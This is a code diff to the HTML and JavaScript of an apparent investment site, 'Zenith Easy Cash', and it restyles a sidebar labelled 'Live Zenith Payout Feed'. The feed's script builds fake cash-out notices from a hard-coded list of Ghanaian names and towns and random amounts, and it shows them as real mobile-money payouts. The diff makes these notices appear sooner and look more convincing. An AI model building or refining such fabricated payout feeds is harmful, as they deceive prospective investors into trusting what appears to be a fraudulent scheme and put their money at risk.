@@ -190,7 +190,6 @@ ZENITH_ALERTS_TOP_HTML = """
     <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
 </div>
 <script>
-    // Expanded, professional array of names and regions across Ghana
     const ghanaNames = [
         "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
         "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills",
@@ -510,9 +509,57 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     <title>Investor Dashboard - Zenith Easy Cash</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
-        .main-layout { max-width: 1050px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        .main-layout { max-width: 1200px; margin: auto; display: flex; gap: 25px; align-items: flex-start; }
         .dashboard-container { flex: 2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .sidebar-ticker { flex: 1; background: #111; color: #00ff66; padding: 20px; border-radius: 8px; position: sticky; top: 20px; max-height: 80vh; overflow-y: auto; }
+        
+        /* PROFESSIONAL SIDEBAR TICKER STYLING */
+        .sidebar-ticker { 
+            flex: 1.1; 
+            background: linear-gradient(145deg, #0f172a, #1e293b); 
+            color: #fff; 
+            padding: 20px; 
+            border-radius: 10px; 
+            position: sticky; 
+            top: 20px; 
+            max-height: 85vh; 
+            overflow-y: auto; 
+            border: 1px solid #334155;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .sidebar-ticker h3 { 
+            color: #4ade80; 
+            font-size: 15px; 
+            margin-top: 0; 
+            border-bottom: 2px solid #334155; 
+            padding-bottom: 10px; 
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .side-ticker-item { 
+            background: rgba(30, 41, 59, 0.8); 
+            border-left: 4px solid #22c55e; 
+            padding: 12px 14px; 
+            margin-bottom: 12px; 
+            border-radius: 6px; 
+            font-size: 13px; 
+            line-height: 1.5;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: transform 0.2s ease;
+            animation: fadeInItem 0.4s ease-in-out;
+        }
+        .side-ticker-item:hover { transform: translateY(-2px); }
+        .side-ticker-item b { color: #facc15; font-weight: 600; }
+        .side-ticker-item .payout-amount { color: #4ade80; font-weight: bold; font-size: 14px; }
+        .side-ticker-item .location { color: #94a3b8; font-size: 11px; display: block; margin-top: 2px; }
+
+        @keyframes fadeInItem {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         h2 { color: #028a0f; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
@@ -536,9 +583,12 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
         .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
-        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
-        .side-ticker-item b { color: #facc15; }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
+
+        @media(max-width: 900px) {
+            .main-layout { flex-direction: column; }
+            .sidebar-ticker { position: relative; top: 0; max-height: none; width: 100%; box-sizing: border-box; }
+        }
     </style>
 </head>
 <body>
@@ -636,7 +686,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         </div>
 
         <div class="sidebar-ticker">
-            <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Payout Feed</h3>
+            <h3>🟢 Live Zenith Payout Feed</h3>
             <div id="sideTickerList"></div>
         </div>
     </div>
@@ -689,7 +739,6 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         updateTrackers();
         updateWithdrawalCountdowns();
 
-        // Expanded sidebar testimonial pool
         const sideNames = [
             "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
             "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills"
@@ -704,16 +753,17 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
             const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
-            // Broader payout range from GHs 450 up to GHs 7,500
             const amt = (Math.floor(Math.random() * 30) + 3) * 100 * 1.5;
             
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
-            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
+            item.innerHTML = `✅ <b>${name}</b><span class="location">📍 ${town}</span><div style="margin-top:4px;">Cashed out <span class="payout-amount">GHs ${amt.toLocaleString()}</span> via MoMo</div>`;
             list.prepend(item);
-            if (list.children.length > 5) list.lastChild.remove();
+            if (list.children.length > 6) list.lastChild.remove();
         }
-        setInterval(addSideTickerItem, 5000);
+        setInterval(addSideTickerItem, 4500);
+        addSideTickerItem();
+        addSideTickerItem();
         addSideTickerItem();
     </script>
 </body>
